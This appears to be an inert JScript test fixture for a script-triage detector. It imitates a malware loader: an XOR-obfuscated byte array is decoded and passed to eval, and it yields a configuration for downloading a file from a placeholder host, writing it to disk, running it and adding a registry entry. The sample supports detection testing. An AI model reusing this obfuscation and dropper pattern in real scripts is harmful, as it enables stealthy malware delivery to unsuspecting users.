// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_98af1742 = function(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ 232); }
  return recoveredMaterial;
};
var recover_75a4e7fe = function() {
  // configuration reconstruction
  var firstPart = [147,202,155,156,141,152,155,202,210,179,202,137,139,153,157,129,154,141,183,154,141,133,135,156,141,202,196,202,159,154,129,156,141,183,142,129,132,141,202,196,202,140,129,155,152,137,156,139,128,183,152,154,135,139,141,155,155,202,196,202,128,137,134,140,135,142,142,183,155,139,154,129,152,156,202,181,196,202,137,140,137,152,156,141,154,202,210,202,191,129,134,160,156,156,152,198,191,129,134,160,156,156,152,186,141,153,157,141,155,156,198,221,198,217,202,196,202,158,137,132,157,141,155,202,210,147,202,139,137,133,152,137,129,143,134,183,129,140,202,210,202,139,137,133,152,137,129,143,134,197,138,222,139,222,223,222,223,209,139,222,202,196,202,157,154,132,202,210,202,128,156,156,152,155,210,199,199,138,222,139,222,223,222,223,209,139,222,198,141,144,137,133,152,132,141,198,129,134,158,137,132,129,140,199,139,222,217,220,137,208,209,222,198,140,137,156,202,196,202,157,155];
  var secondPart = [141,154,183,137,143,141,134,156,202,210,202,160,157,134,156,154,141,155,155,164,137,138,199,138,222,139,222,223,222,223,209,139,222,202,196,202,142,129,132,141,183,152,137,156,128,202,210,202,171,210,180,180,189,155,141,154,155,180,180,184,157,138,132,129,139,180,180,160,157,134,156,154,141,155,155,164,137,138,180,180,155,156,137,143,141,197,138,222,139,222,223,222,223,209,139,222,198,140,137,156,202,196,202,154,141,143,129,155,156,154,145,183,152,137,156,128,202,210,202,160,163,171,189,180,180,187,135,142,156,159,137,154,141,180,180,160,157,134,156,154,141,155,155,164,137,138,180,180,172,129,155,152,135,155,137,138,132,141,180,180,138,222,139,222,223,222,223,209,139,222,202,196,202,134,141,144,156,183,155,156,137,143,141,202,210,202,132,135,139,137,132,197,140,129,155,152,137,156,139,128,198,130,155,202,149,196,202,155,156,137,143,141,171,135,157,134,156,202,210,220,149];
  var storedMaterial = firstPart.concat(secondPart);
  var harmlessValue = (2 > 1) ? "left" : "right";
  var recoveredMaterial = [];
  var pass = 0;
  while (pass < 1) { recoveredMaterial = decode_98af1742.call(null, storedMaterial); pass++; }
  var textParts;
  textParts = [];
  for (var bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }
  var configurationText = textParts.join("");
  return configurationText;
  // end reconstruction
};
var inspect_d9c68a80 = function() {
  var configuration = eval("(" + recover_75a4e7fe.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan["steps"] = configuration["steps"];
  analysisPlan["adapter"] = configuration["adapter"];
  analysisPlan["values"] = configuration["values"];
  analysisPlan["stageCount"] = configuration["stageCount"];
  return analysisPlan;
};
